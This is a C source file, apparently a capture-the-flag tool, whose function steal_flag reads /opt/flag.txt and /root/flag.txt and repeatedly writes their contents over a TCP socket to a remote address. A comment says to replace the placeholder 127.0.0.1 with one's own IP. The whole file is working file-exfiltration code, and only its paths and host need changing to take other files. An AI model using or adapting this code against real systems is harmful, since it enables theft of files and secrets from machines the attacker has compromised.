#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#define MAX 80
#define PORT 8888
#define SA struct sockaddr

char* read_flag(char* flag, char *path) {
//refer here
//https://smallbusiness.chron.com/read-first-line-file-c-programming-29321.html
//
//pointer fixed with this
//https://www.educative.io/edpresso/resolving-the-function-returns-address-of-local-variable-error
	
	FILE *fileStream;
	//char fileText [100]; //just in case it doesnt work, use this instead
	fileStream = fopen (path, "r");
	fgets (flag, 100, fileStream);
	fclose(fileStream);
	return flag;
}

void steal_flag(int sockfd)
{
	char buff[MAX];
	char userPath[] = "/opt/flag.txt"; //change flag location here
	char rootPath[] = "/root/flag.txt"; // change second flag location here
	char *flag = malloc(100);
	char *rootFlag = malloc(100);
	int n;
	for (;;) {
		bzero(buff, sizeof(buff));
		n = 0;
		//get user flag
		flag = read_flag(flag,userPath);
		rootFlag = read_flag(rootFlag,rootPath);
		strcat(flag,rootFlag);
		strcpy(buff, flag);
		//const char* buff = read_buff();
		sleep(1);
		write(sockfd, buff, sizeof(buff));
	}
}

int main()
{
	//refer here
	//https://www.geeksforgeeks.org/tcp-server-client-implementation-in-c/
	int sockfd, connfd;
	struct sockaddr_in servaddr, cli;

	// socket create and varification
	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if (sockfd == -1) {
		printf("socket creation failed...\n");
		exit(0);
	}
	else
		printf("Socket successfully created..\n");
	bzero(&servaddr, sizeof(servaddr));

	// assign IP, PORT
	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = inet_addr("127.0.0.1"); //change ip address t yours
	servaddr.sin_port = htons(PORT);

	// connect the client socket to server socket
	if (connect(sockfd, (SA*)&servaddr, sizeof(servaddr)) != 0) {
		printf("connection with the server failed...\n");
		exit(0);
	}
	else
		printf("connected to the server..\n");

	// function for chat
	steal_flag(sockfd);

	// close the socket
	close(sockfd);
}

